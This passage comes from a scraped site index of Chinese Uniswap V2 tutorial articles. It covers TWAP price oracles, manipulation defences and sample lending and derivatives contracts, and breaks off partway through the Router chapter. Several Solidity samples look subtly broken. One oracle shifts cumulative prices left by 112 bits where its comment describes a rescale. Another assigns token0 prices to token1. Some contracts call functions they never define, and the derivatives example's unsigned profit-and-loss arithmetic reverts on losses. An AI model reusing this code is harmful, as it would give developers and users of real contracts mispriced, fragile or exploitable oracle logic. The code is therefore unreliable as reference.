Swap回调同交易内归还\n\n下一篇预告\n在下一篇文章中，我们将深入探讨价格预言机，包括：\n\nTWAP原理与实现\n价格累积机制\n防操纵策略\n预言机集成最佳实践\n\n\n参考资料\n\nUniswap V2 Core - UniswapV2Pair.sol\nUniswap V2 Periphery - UniswapV2Router02.sol\nFlash Swaps Explained\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/05-价格预言机":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/05-价格预言机","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/05-价格预言机.md","title":"05-价格预言机","links":[],"tags":[],"content":"死磕Uniswap V2（五）：价格预言机\n\n本文是「死磕Uniswap V2」系列的第五篇，深入剖析V2的TWAP预言机机制。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V2概述与核心原理恒定乘积AMM、核心公式02Factory与Pair合约合约结构、创建流程03流动性与LP代币mint/burn、份额计算04交换机制深度解析swap函数、滑点、Flash Swap05价格预言机TWAP、价格计算06Router与路由最佳路径、多跳交易07安全实践与最佳实践漏洞防护、开发建议\n\n1. 预言机概览\n1.1 什么是TWAP？\nTWAP (Time-Weighted Average Price) 即时间加权平均价格，通过累积价格随时间的变化来计算平均价格。\ngraph LR\n    subgraph SpotPrice[\\&quot;即时价格\\&quot;]\n        S1[\\&quot;t1: 1000\\&quot;]\n        S2[\\&quot;t2: 1050\\&quot;]\n        S3[\\&quot;t3: 1025\\&quot;]\n    end\n\n    subgraph TWAP[\\&quot;时间加权平均\\&quot;]\n        T1[\\&quot;按时间加权\\&quot;]\n        T2[\\&quot;累积计算\\&quot;]\n        T3[\\&quot;平滑波动\\&quot;]\n    end\n\n    subgraph Result[\\&quot;结果\\&quot;]\n        R1[\\&quot;可操纵性低\\&quot;]\n        R2[\\&quot;价格更可靠\\&quot;]\n    end\n\n    SpotPrice --&gt; TWAP --&gt; Result\n\n    style R1 fill:#c8e6c9\n    style R2 fill:#c8e6c9\n\n1.2 为什么需要TWAP？\ngraph TB\n    subgraph Problems[\\&quot;即时价格的问题\\&quot;]\n        P1[\\&quot;易于操纵\\&quot;]\n        P2[\\&quot;波动性大\\&quot;]\n        P3[\\&quot;时效性短\\&quot;]\n    end\n\n    subgraph Solutions[\\&quot;TWAP的优势\\&quot;]\n        S1[\\&quot;抗操纵\\&quot;]\n        S2[\\&quot;平滑价格\\&quot;]\n        S3[\\&quot;历史追溯\\&quot;]\n    end\n\n    Problems --&gt; Solutions\n\n    style Solutions fill:#c8e6c9\n\n1.3 TWAP vs 其他预言机\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n预言机类型优点缺点适用场景即时价格实时、简单易操纵、波动大快速交易TWAP抗操纵、可靠有延迟一般价格查询MA (移动平均)平滑滞后明显趋势分析EMA (指数移动)反应快仍可操纵短期趋势外部预言机权威依赖第三方关键价格\n\n2. 累积价格机制\n2.1 核心变量\ncontract UniswapV2Pair {\n    /// @notice 上一次更新的区块时间戳\n    uint32 public blockTimestampLast;\n \n    /// @notice Token0的累积价格 (reserve1/reserve0)\n    uint256 public price0CumulativeLast;\n \n    /// @notice Token1的累积价格 (reserve0/reserve1)\n    uint256 public price1CumulativeLast;\n}\n2.2 累积价格公式\nprice0Cumulative = Σ(price0 × timeElapsed)\n                  = Σ((reserve1 / reserve0) × timeElapsed)\n\nprice1Cumulative = Σ(price1 × timeElapsed)\n                  = Σ((reserve0 / reserve1) × timeElapsed)\n\n其中：\n\nprice0: Token0的价格（以Token1计价）\nprice1: Token1的价格（以Token0计价）\ntimeElapsed: 距上次更新的时间差\n\n2.3 _update函数中的价格累积\nfunction _update(\n    uint256 balance0,\n    uint256 balance1\n) private {\n    // 1. 获取当前时间戳\n    uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n    uint32 timeElapsed = blockTimestamp - blockTimestampLast;\n \n    // 2. 如果有新交易且有储备，更新累积价格\n    if (timeElapsed &gt; 0 &amp;&amp; reserve0 &gt; 0 &amp;&amp; reserve1 &gt; 0) {\n        // price0 = reserve1 / reserve0 (Token0以Token1计价)\n        // 乘以2^112转换为UQ112x112格式\n        uint256 price0 = (reserve1 * 2**112) / reserve0;\n        price0CumulativeLast += price0 * timeElapsed;\n \n        // price1 = reserve0 / reserve1 (Token1以Token0计价)\n        uint256 price1 = (reserve0 * 2**112) / reserve1;\n        price1CumulativeLast += price1 * timeElapsed;\n    }\n \n    // 3. 更新储备和时间戳\n    reserve0 = uint112(balance0);\n    reserve1 = uint112(balance1);\n    blockTimestampLast = blockTimestamp;\n \n    emit Sync(reserve0, reserve1);\n}\n2.4 累积价格可视化\ngantt\n    title 累积价格随时间增长\n    dateFormat  HH:mm\n    axisFormat  %H:%M\n\n    section 价格累积\n    初始: 1000      :a1, 00:00, 5m\n    累积1: +500      :a1, 00:05, 5m\n    累积2: +480      :a1, 00:10, 5m\n    累积3: +520      :a1, 00:15, 5m\n\n    section 累积结果\n    price0Cumulative: crit, 00:00, 20m\n\n\n3. TWAP计算\n3.1 计算公式\nTWAP = (priceCumulativeCurrent - priceCumulativePast) / timeDiff\n\n计算步骤：\n\n记录过去时间点的累积价格\n获取当前累积价格\n计算差值\n除以时间差\n\n3.2 预言机合约实现\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;\n \ncontract UniswapV2TWAPOracle {\n    struct Observation {\n        uint256 timestamp;\n        uint256 price0Cumulative;\n        uint256 price1Cumulative;\n    }\n \n    mapping(address =&gt; Observation[]) public observations;\n \n    uint256 public constant WINDOW_SIZE = 1 hours;\n \n    /// @notice 记录价格观察值\n    function observe(\n        address pair\n    ) external {\n        (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) =\n            IUniswapV2Pair(pair).getReserves();\n \n        uint256 price0Cumulative = IUniswapV2Pair(pair).price0CumulativeLast();\n        uint256 price1Cumulative = IUniswapV2Pair(pair).price1CumulativeLast();\n \n        observations[pair].push(Observation({\n            timestamp: blockTimestampLast,\n            price0Cumulative: price0Cumulative,\n            price1Cumulative: price1Cumulative\n        }));\n \n        // 限制观察值数量\n        if (observations[pair].length &gt; 10) {\n            // 移除最旧的观察值\n            for (uint i = 0; i &lt; observations[pair].length - 1; i++) {\n                observations[pair][i] = observations[pair][i + 1];\n            }\n            observations[pair].pop();\n        }\n    }\n \n    /// @notice 计算TWAP\n    function consult(\n        address pair,\n        uint256 period\n    ) external view returns (uint256 price0, uint256 price1) {\n        require(\n            observations[pair].length &gt;= 2,\n            &quot;Need at least 2 observations&quot;\n        );\n \n        Observation memory oldest = observations[pair][0];\n        Observation memory newest = observations[pair][observations[pair].length - 1];\n \n        uint256 timeDiff = newest.timestamp - oldest.timestamp;\n        require(timeDiff &gt;= period, &quot;Period not covered&quot;);\n \n        // 计算TWAP\n        uint256 price0CumulativeDiff = newest.price0Cumulative - oldest.price0Cumulative;\n        uint256 price1CumulativeDiff = newest.price1Cumulative - oldest.price1Cumulative;\n \n        // 除以时间差，再除以2^112转换为正常精度\n        price0 = (price0CumulativeDiff / timeDiff) &gt;&gt; 112;\n        price1 = (price1CumulativeDiff / timeDiff) &gt;&gt; 112;\n    }\n \n    /// @notice 获取当前价格（用于比较）\n    function spotPrice(\n        address pair\n    ) external view returns (uint256 price0, uint256 price1) {\n        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();\n        price0 = (uint256(reserve1) * 1e18) / reserve0;\n        price1 = (uint256(reserve0) * 1e18) / reserve1;\n    }\n}\n3.3 滑动窗口实现\nmermaid\nflowchart TD\n    A[\\&quot;新交易发生\\&quot;] --&gt; B[\\&quot;更新储备量\\&quot;]\n    B --&gt; C[\\&quot;计算当前价格\\&quot;]\n    C --&gt; D[\\&quot;累积到price0CumulativeLast\\&quot;]\n    D --&gt; E[\\&quot;更新时间戳\\&quot;]\n    E --&gt; F[\\&quot;记录观察值\\&quot;]\n    F --&gt; G{观察值数量&gt;阈值?}\n    G --&gt;|是| H[\\&quot;移除最旧观察值\\&quot;]\n    G --&gt;|否| I[\\&quot;保留所有观察值\\&quot;]\n    H --&gt; J[\\&quot;计算TWAP&lt;br/&gt;使用滑动窗口\\&quot;]\n    I --&gt; J\n3.4 高级TWAP合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;\n \ncontract AdvancedTWAPOracle {\n    struct Observation {\n        uint256 timestamp;\n        uint256 price0Cumulative;\n        uint256 price1Cumulative;\n        bool initialized;\n    }\n \n    uint256 public constant GRANULARITY = 24; // 每小时一个观察值\n    uint256 public constant PERIOD = 24 hours; // 24小时TWAP\n \n    mapping(address =&gt; Observation[GRANULARITY]) public observations;\n    mapping(address =&gt; uint256) public observationIndices;\n \n    event Updated(address indexed pair, uint256 price0, uint256 price1);\n \n    /// @notice 更新观察值\n    function update(address pair) external {\n        Observation[GRANULARITY] storage obsArray = observations[pair];\n        uint256 index = observationIndices[pair];\n        uint256 lastTimestamp = obsArray[index].timestamp;\n \n        // 需要至少过1小时才更新\n        if (lastTimestamp == 0 || block.timestamp - lastTimestamp &gt;= 1 hours) {\n            (, , uint32 blockTimestampLast) = IUniswapV2Pair(pair).getReserves();\n            uint256 price0Cumulative = IUniswapV2Pair(pair).price0CumulativeLast();\n            uint256 price1Cumulative = IUniswapV2Pair(pair).price1CumulativeLast();\n \n            observations[pair][index] = Observation({\n                timestamp: blockTimestampLast,\n                price0Cumulative: price0Cumulative,\n                price1Cumulative: price1Cumulative,\n                initialized: true\n            });\n \n            observationIndices[pair] = (index + 1) % GRANULARITY;\n \n            (uint256 price0, uint256 price1) = consult(pair);\n            emit Updated(pair, price0, price1);\n        }\n    }\n \n    /// @notice 查询TWAP价格\n    function consult(address pair)\n        public\n        view\n        returns (uint256 price0, uint256 price1)\n    {\n        Observation[GRANULARITY] storage obsArray = observations[pair];\n \n        uint256 currentIdx = observationIndices[pair];\n        uint256 oldestIdx = (currentIdx + 1) % GRANULARITY;\n \n        Observation memory oldest = obsArray[oldestIdx];\n        Observation memory newest = obsArray[(currentIdx + GRANULARITY - 1) % GRANULARITY];\n \n        require(oldest.initialized &amp;&amp; newest.initialized, &quot;Not enough data&quot;);\n        require(newest.timestamp &gt; oldest.timestamp, &quot;Invalid timestamps&quot;);\n \n        uint256 timeDiff = newest.timestamp - oldest.timestamp;\n        require(timeDiff &gt;= PERIOD - 1 hours, &quot;Not enough time passed&quot;);\n \n        uint256 price0Diff = newest.price0Cumulative - oldest.price0Cumulative;\n        uint256 price1Diff = newest.price1Cumulative - oldest.price1Cumulative;\n \n        // 转换UQ112x112到1e18精度\n        price0 = (price0Diff &lt;&lt; 112) / timeDiff;\n        price1 = (price1Diff &lt;&lt; 112) / timeDiff;\n    }\n \n    /// @notice 获取即时价格\n    function getSpotPrice(address pair)\n        external\n        view\n        returns (uint256 price0, uint256 price1)\n    {\n        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();\n        price0 = (uint256(reserve1) &lt;&lt; 112) / reserve0;\n        price1 = (uint256(reserve0) &lt;&lt; 112) / reserve1;\n    }\n \n    /// @notice 计算价格偏差\n    function getPriceDeviation(address pair)\n        external\n        view\n        returns (uint256 deviation0Bps, uint256 deviation1Bps)\n    {\n        (uint256 twapPrice0, uint256 twapPrice1) = consult(pair);\n        (uint256 spotPrice0, uint256 spotPrice1) = this.getSpotPrice(pair);\n \n        if (twapPrice0 &gt; spotPrice0) {\n            deviation0Bps = ((twapPrice0 - spotPrice0) * 10000) / twapPrice0;\n        } else {\n            deviation0Bps = ((spotPrice0 - twapPrice0) * 10000) / twapPrice0;\n        }\n \n        if (twapPrice1 &gt; spotPrice1) {\n            deviation1Bps = ((twapPrice1 - spotPrice1) * 10000) / twapPrice1;\n        } else {\n            deviation1Bps = ((spotPrice1 - twapPrice1) * 10000) / twapPrice1;\n        }\n    }\n}\n\n4. 价格操纵与防护\n4.1 价格操纵方式\ngraph TB\n    subgraph Attacks[\\&quot;价格操纵攻击\\&quot;]\n        Flash[\\&quot;闪电贷攻击\\&quot;]\n        Sandwich[\\&quot;三明治攻击\\&quot;]\n        Wash[\\&quot;洗盘交易\\&quot;]\n    end\n\n    subgraph FlashAttack[\\&quot;闪电贷攻击流程\\&quot;]\n        F1[\\&quot;借入大量资金\\&quot;]\n        F2[\\&quot;在Pair交易\\&quot;]\n        F3[\\&quot;操纵价格\\&quot;]\n        F4[\\&quot;触发依赖价格的逻辑\\&quot;]\n        F5[\\&quot;归还贷款\\&quot;]\n    end\n\n    Flash --&gt; FlashAttack\n\n    style FlashAttack fill:#ffcdd2\n\n4.2 TWAP抗操纵原理\nflowchart LR\n    A[\\&quot;操纵者尝试&lt;br/&gt;瞬间拉高价格\\&quot;] --&gt; B[\\&quot;累积价格&lt;br/&gt;小幅增加\\&quot;]\n    B --&gt; C[\\&quot;时间很短&lt;br/&gt;t ≈ 0\\&quot;]\n    C --&gt; D[\\&quot;影响很小&lt;br/&gt;Δ ≈ price × 0\\&quot;]\n    D --&gt; E[\\&quot;TWAP几乎不受影响\\&quot;]\n\n    style E fill:#c8e6c9\n\n数学证明：\n假设操纵者将价格从P操纵到P&#039;(P&#039; &gt;&gt; P)\n\n操纵时间: t (很短，比如几秒)\n累积价格增加: (P&#039; - P) × t ≈ P&#039; × t\n\n如果t只有3秒：\n影响 = P&#039; × 3 / (总时间 × 平均价格)\n\n如果TWAP周期是1小时(3600秒)：\n影响 = P&#039; × 3 / 3600 ≈ 0.0008 × P&#039;\n\n结论: 短暂操纵对TWAP影响微乎其微\n\n4.3 防护策略\ncontract ProtectedPriceOracle {\n    uint256 public constant MIN_PERIOD = 1 hours;\n    uint256 public constant MAX_DEVIATION = 300; // 3%\n \n    /// @notice 安全的价格查询\n    function safeConsult(\n        address pair,\n        uint256 minPeriod,\n        uint256 maxDeviation\n    ) external view returns (uint256 price0, uint256 price1) {\n        // 1. 确保时间窗口足够长\n        require(minPeriod &gt;= MIN_PERIOD, &quot;Period too short&quot;);\n \n        // 2. 获取TWAP价格\n        (uint256 twap0, uint256 twap1) = consult(pair, minPeriod);\n \n        // 3. 获取即时价格\n        (uint256 spot0, uint256 spot1) = getSpotPrice(pair);\n \n        // 4. 计算偏差\n        uint256 deviation0 = calculateDeviation(spot0, twap0);\n        uint256 deviation1 = calculateDeviation(spot1, twap1);\n \n        // 5. 偏差过大则拒绝\n        require(\n            deviation0 &lt;= maxDeviation &amp;&amp; deviation1 &lt;= maxDeviation,\n            &quot;Price deviation too high&quot;\n        );\n \n        return (twap0, twap1);\n    }\n \n    function calculateDeviation(\n        uint256 spot,\n        uint256 twap\n    ) internal pure returns (uint256 deviationBps) {\n        if (spot &gt; twap) {\n            deviationBps = ((spot - twap) * 10000) / twap;\n        } else {\n            deviationBps = ((twap - spot) * 10000) / twap;\n        }\n    }\n}\n4.4 多时间窗口验证\ncontract MultiWindowOracle {\n    /// @notice 使用多个时间窗口验证价格\n    function multiWindowConsult(\n        address pair\n    ) external view returns (\n        uint256 price0,\n        uint256 price1,\n        bool trusted\n    ) {\n        // 获取不同时间窗口的TWAP\n        (uint256 price0_1h, ) = consult(pair, 1 hours);\n        (uint256 price0_6h, ) = consult(pair, 6 hours);\n        (uint256 price0_24h, ) = consult(pair, 24 hours);\n \n        // 计算各窗口价格的一致性\n        uint256 dev1_6 = calculateDeviation(price0_1h, price0_6h);\n        uint256 dev6_24 = calculateDeviation(price0_6h, price0_24h);\n \n        // 如果偏差过大，可能被操纵\n        trusted = dev1_6 &lt; 100 &amp;&amp; dev6_24 &lt; 100; // 1%阈值\n \n        price0 = trusted ? price0_1h : price0_24h; // 使用更安全的价格\n        price1 = trusted ? price0_1h : price0_24h;\n    }\n}\n\n5. 预言机应用场景\n5.1 借贷协议\ncontract LendingProtocol {\n    AdvancedTWAPOracle public oracle;\n \n    mapping(address =&gt; uint256) public collateral;\n    mapping(address =&gt; uint256) public debt;\n \n    uint256 public constant COLLATERAL_RATIO = 150; // 150%\n \n    /// @notice 检查清算\n    function checkLiquidation(address user) external {\n        // 使用TWAP获取抵押品价格\n        (uint256 ethPrice, ) = oracle.consult(wethUsdcPair);\n \n        uint256 collateralValue = (collateral[user] * ethPrice) / 1e18;\n        uint256 requiredCollateral = (debt[user] * COLLATERAL_RATIO) / 100;\n \n        if (collateralValue &lt; requiredCollateral) {\n            emit Liquidatable(user, collateralValue, requiredCollateral);\n        }\n    }\n \n    /// @notice 借款（使用TWAP验证）\n    function borrow(uint256 amount) external {\n        // ... 确保有足够抵押品 ...\n \n        // 使用TWAP而不是即时价格\n        (uint256 ethPrice, ) = oracle.consult(wethUsdcPair);\n        // ... 借款逻辑 ...\n    }\n \n    event Liquidatable(address indexed user, uint256 collateral, uint256 required);\n}\n5.2 衍生品交易\ncontract DerivativesExchange {\n    AdvancedTWAPOracle public oracle;\n \n    struct Position {\n        address trader;\n        uint256 size;\n        uint256 entryPrice;\n        bool isLong;\n    }\n \n    mapping(uint256 =&gt; Position) public positions;\n \n    /// @notice 计算未实现盈亏\n    function getUnrealizedPnL(uint256 positionId)\n        external\n        view\n        returns (int256 pnl)\n    {\n        Position memory pos = positions[positionId];\n        (uint256 currentPrice, ) = oracle.consult(underlyingPair);\n \n        if (pos.isLong) {\n            pnl = int256((currentPrice - pos.entryPrice) * pos.size / pos.entryPrice);\n        } else {\n            pnl = int256((pos.entryPrice - currentPrice) * pos.size / pos.entryPrice);\n        }\n    }\n \n    /// @notice 平仓\n    function closePosition(uint256 positionId) external {\n        Position memory pos = positions[positionId];\n        require(pos.trader == msg.sender, &quot;Not owner&quot;);\n \n        (uint256 exitPrice, ) = oracle.consult(underlyingPair);\n \n        // 计算最终盈亏并结算\n        int256 pnl = pos.isLong\n            ? int256((exitPrice - pos.entryPrice) * pos.size / pos.entryPrice)\n            : int256((pos.entryPrice - exitPrice) * pos.size / pos.entryPrice);\n \n        if (pnl &gt; 0) {\n            // 盈利：支付给交易者\n            IERC20(usdc).transfer(msg.sender, uint256(pnl));\n        }\n \n        delete positions[positionId];\n    }\n}\n5.3 NFT地板价预言机\ncontract NFTFloorOracle {\n    // 使用NFT/ETH池的TWAP作为地板价参考\n \n    function getNFTFloorPrice(\n        address nftCollection\n    ) external view returns (uint256 floorPrice) {\n        // 获取NFT-ETH交易对\n        address pair = IUniswapV2Factory(factory).getPair(nftToken, weth);\n \n        if (pair == address(0)) {\n            revert(&quot;No pool found&quot;);\n        }\n \n        // 使用24小时TWAP\n        (uint256 ethPerNft, ) = oracle.consult(pair, 24 hours);\n        uint256 ethPriceUsd = oracle.consult(ethUsdPair, 1 hours);\n \n        // 转换为USD\n        floorPrice = (ethPerNft * ethPriceUsd) / 1e18;\n    }\n}\n\n6. 预言机最佳实践\n6.1 设计原则\nmindmap\n  root((预言机设计))\n    时间窗口\n      足够长\n      可配置\n      多窗口验证\n    数据验证\n      价格合理性\n      与其他源对比\n      偏差检测\n    事件响应\n      异常触发\n      暂停机制\n      人工干预\n    更新策略\n      自动更新\n      触发条件\n      频率控制\n\n6.2 完整预言机合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;\nimport &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;\nimport &quot;@openzeppelin/contracts/security/Pausable.sol&quot;;\n \ncontract RobustOracle is Ownable, Pausable {\n    struct PriceData {\n        uint256 price;\n        uint256 timestamp;\n        bool valid;\n    }\n \n    struct Config {\n        address pair;\n        uint256 minPeriod;\n        uint256 maxPeriod;\n        uint256 maxDeviation;\n        bool enabled;\n    }\n \n    mapping(address =&gt; Config) public configs;\n    mapping(address =&gt; PriceData) public latestPrices;\n \n    uint256 public constant MAX_DEVIATION_DEFAULT = 500; // 5%\n    uint256 public constant MIN_PERIOD_DEFAULT = 1 hours;\n    uint256 public constant MAX_PERIOD_DEFAULT = 24 hours;\n \n    event PriceUpdated(\n        address indexed token,\n        uint256 price,\n        uint256 timestamp\n    );\n \n    event ConfigUpdated(\n        address indexed pair,\n        uint256 minPeriod,\n        uint256 maxPeriod,\n        uint256 maxDeviation\n    );\n \n    event PriceAnomaly(\n        address indexed pair,\n        uint256 twapPrice,\n        uint256 spotPrice,\n        uint256 deviation\n    );\n \n    /// @notice 更新价格\n    function updatePrice(address token) external whenNotPaused {\n        Config memory config = configs[token];\n        require(config.enabled, &quot;Token not enabled&quot;);\n \n        // 使用TWAP获取价格\n        uint256 price = _getTWAP(\n            config.pair,\n            config.minPeriod\n        );\n \n        // 验证价格\n        require(_validatePrice(token, price, config), &quot;Invalid price&quot;);\n \n        latestPrices[token] = PriceData({\n            price: price,\n            timestamp: block.timestamp,\n            valid: true\n        });\n \n        emit PriceUpdated(token, price, block.timestamp);\n    }\n \n    /// @notice 获取价格\n    function getPrice(address token)\n        external\n        view\n        returns (uint256 price, uint256 timestamp)\n    {\n        PriceData memory data = latestPrices[token];\n        require(data.valid, &quot;Price not available&quot;);\n        require(\n            block.timestamp - data.timestamp &lt; 1 hours,\n            &quot;Price stale&quot;\n        );\n \n        return (data.price, data.timestamp);\n    }\n \n    /// @notice 获取TWAP\n    function _getTWAP(\n        address pair,\n        uint256 period\n    ) internal view returns (uint256 price) {\n        // 实现TWAP计算\n        (, , uint32 blockTimestampLast) = IUniswapV2Pair(pair).getReserves();\n        uint256 price0Cumulative = IUniswapV2Pair(pair).price0CumulativeLast();\n \n        // 这里需要历史观察值，简化实现\n        price = price0Cumulative &gt;&gt; 112;\n    }\n \n    /// @notice 验证价格\n    function _validatePrice(\n        address token,\n        uint256 newPrice,\n        Config memory config\n    ) internal view returns (bool) {\n        PriceData memory oldData = latestPrices[token];\n \n        // 如果没有历史价格，接受\n        if (!oldData.valid) {\n            return true;\n        }\n \n        // 计算价格变化\n        uint256 deviation;\n        if (newPrice &gt; oldData.price) {\n            deviation = ((newPrice - oldData.price) * 10000) / oldData.price;\n        } else {\n            deviation = ((oldData.price - newPrice) * 10000) / oldData.price;\n        }\n \n        // 检查偏差\n        if (deviation &gt; config.maxDeviation) {\n            // 可选：emit anomaly event\n            return false;\n        }\n \n        return true;\n    }\n \n    /// @notice 配置预言机\n    function setConfig(\n        address token,\n        address pair,\n        uint256 minPeriod,\n        uint256 maxPeriod,\n        uint256 maxDeviation\n    ) external onlyOwner {\n        require(pair != address(0), &quot;Invalid pair&quot;);\n        require(minPeriod &gt;= MIN_PERIOD_DEFAULT, &quot;Min period too short&quot;);\n        require(maxPeriod &lt;= MAX_PERIOD_DEFAULT, &quot;Max period too long&quot;);\n        require(maxDeviation &lt;= 1000, &quot;Max deviation too high&quot;); // 10%\n \n        configs[token] = Config({\n            pair: pair,\n            minPeriod: minPeriod,\n            maxPeriod: maxPeriod,\n            maxDeviation: maxDeviation,\n            enabled: true\n        });\n \n        emit ConfigUpdated(token, minPeriod, maxPeriod, maxDeviation);\n    }\n \n    /// @notice 暂停预言机\n    function pause() external onlyOwner {\n        _pause();\n    }\n \n    /// @notice 恢复预言机\n    function unpause() external onlyOwner {\n        _unpause();\n    }\n}\n\n7. 本章小结\n7.1 TWAP总结\nmindmap\n  root((TWAP预言机))\n    核心机制\n      累积价格\n      时间加权\n      UQ112x112格式\n    优势\n      抗操纵\n      平滑波动\n      链上可验证\n    应用场景\n      借贷协议\n      衍生品\n      NFT定价\n    最佳实践\n      时间窗口足够长\n      多时间窗口验证\n      偏差检测\n      异常处理\n\n7.2 关键公式回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n公式含义priceCumulative += (reserve1/reserve0) × timeElapsed累积价格TWAP = (current - past) / timeDiffTWAP计算deviation = |spot - twap| / twap价格偏差\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Router与路由，包括：\n\nRouter合约架构\n多跳交易机制\n最佳路径算法\n路由最佳实践\n\n\n参考资料\n\nUniswap V2 Whitepaper - Oracles\nUniswap V2 Core - UniswapV2Pair.sol\nTWAP Best Practices\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/06-Router与路由":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/06-Router与路由","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/06-Router与路由.md","title":"06-Router与路由","links":[],"tags":[],"content":"死磕Uniswap V2（六）：Router与路由\n\n本文是「死磕Uniswap V2」系列的第六篇，深入剖析V2的Router合约与路由机制。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V2概述与核心原理恒定乘积AMM、核心公式02Factory与Pair合约合约结构、创建流程03流动性与LP代币mint/burn、份额计算04交换机制深度解析swap函数、滑点、Flash Swap05价格预言机TWAP、价格计算06Router与路由最佳路径、多跳交易07安全实践与最佳实践漏洞防护、开发建议\n\n1. Router合约概览\n1.1 Router的职责\ngraph TB\n    subgraph Router[\\&quot;Router合约职责\\&quot;]\n        R1[\\&quot;封装Pair交互\\&quot;]\n        R2[\\&quot;多跳路由\\&quot;]\n        R3[\\&quot;流动性管理\\&quot;]\n        R4[\\&quot;滑点保护\\&quot;]\n    end\n\n    subgraph Benefits[\\&quot;用户收益\\&quot;]\n        B1[\\&quot;简化交易\\&quot;]\n        B2[\\&quot;最佳路径\\&quot;]\n        B3[\\&quot;原子化执行\\&quot;]\n    end\n\n    Router --&gt; Benefits\n\n    style Benefits fill:#c8e6c9\n\n1.2 Router vs 直接调用Pair\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性直接调用Pair通过Router代码复杂度高低多跳支持需手动实现内置支持流动性添加复杂简化API滑点保护需自己实现内置支持WETH处理需手动包装/解包自动处理\n1.3 Router合约架构\nclassDiagram\n    class UniswapV2Router02 {\n        +address factory\n        +address WETH\n        +swapExactTokensForTokens()\n        +swapTokensForExactTokens()\n        +swapExactETHForTokens()\n        +swapTokensForExactETH()\n        +swapExactTokensForETH()\n        +swapETHForExactTokens()\n        +addLiquidity()\n        +addLiquidityETH()\n        +removeLiquidity()\n        +removeLiquidityETH()\n    }\n\n    class IWETH {\n        +deposit()\n        +withdraw()\n    }\n\n    class IUniswapV2Factory {\n        +getPair()\n        +createPair()\n    }\n\n    class IUniswapV2Pair {\n        +swap()\n        +getReserves()\n    }\n\n    UniswapV2Router02 --&gt; IWETH\n    UniswapV2Router02 --&gt; IUniswapV2Factory\n    UniswapV2Router02 --&gt; IUniswapV2Pair\n\n\n2. Router核心功能\n2.1 Router合约变量\ncontract UniswapV2Router02 is IUniswapV2Router02 {\n    /// @notice Factory合约地址\n    address public immutable factory;\n \n    /// @notice WETH地址\n    address public immutable WETH;\n \n    constructor(address _factory, address _WETH) {\n        factory = _factory;\n        WETH = _WETH;\n    }\n}\n2.2 swapExactTokensForTokens\nfunction swapExactTokensForTokens(\n    uint256 amountIn,           // 精确输入数量\n    uint256 amountOutMin,       // 最小输出数量（滑点保护）\n    address[] calldata path,     // 交易路径\n    address to,                 // 接收地址\n    uint256 deadline            // 截止时间\n) external returns (uint256[] memory amounts) {\n    // 1. 检查截止时间\n    require(deadline &gt;= block.timestamp, &quot;UniswapV2Router: EXPIRED&quot;);\n \n    // 2. 验证路径\n    require(path.length &gt;= 2, &quot;Invalid path&quot;);\n \n    // 3. 计算各步输出\n    amounts = getAmountsOut(amountIn, path);\n \n    // 4. 验证最小输出\n    require(\n        amounts[amounts.length - 1] &gt;= amountOutMin,\n        &quot;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&quot;\n    );\n \n    // 5. 执行交易\n    _safeSwap(\n        amounts,\n        path,\n        to\n    );\n}\n2.3 swapTokensForExactTokens\nfunction swapTokensForExactTokens(\n    uint256 amountOut,          // 精确输出数量\n    uint256 amountInMax,        // 最大输入数量\n    address[] calldata path,\n    address to,\n    uint256 deadline\n) external returns (uint256[] memory amounts) {\n    require(deadline &gt;= block.timestamp, &quot;UniswapV2Router: EXPIRED&quot;);\n \n    // 从输出反推输入\n    amounts = getAmountsIn(amountOut, path);\n \n    // 验证输入不超过最大值\n    require(\n        amounts[0] &lt;= amountInMax,\n        &quot;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&quot;\n    );\n \n    _safeSwap(amounts, path, to);\n}\n2.4 ETH相关交换函数\n// ETH -&gt; Tokens\nfunction swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n) external payable returns (uint256[] memory amounts) {\n    require(deadline &gt;= block.timestamp, &quot;UniswapV2Router: EXPIRED&quot;);\n    require(path[0] == WETH, &quot;UniswapV2Router: INVALID_PATH&quot;);\n \n    amounts = getAmountsOut(msg.value, path);\n    require(\n        amounts[amounts.length - 1] &gt;= amountOutMin,\n        &quot;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&quot;\n    );\n \n    // 将ETH包装为WETH\n    IWETH(WETH).deposit{value: amounts[0]}();\n    assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n \n    _swap(amounts, path, to);\n}\n \n// Tokens -&gt; ETH\nfunction swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 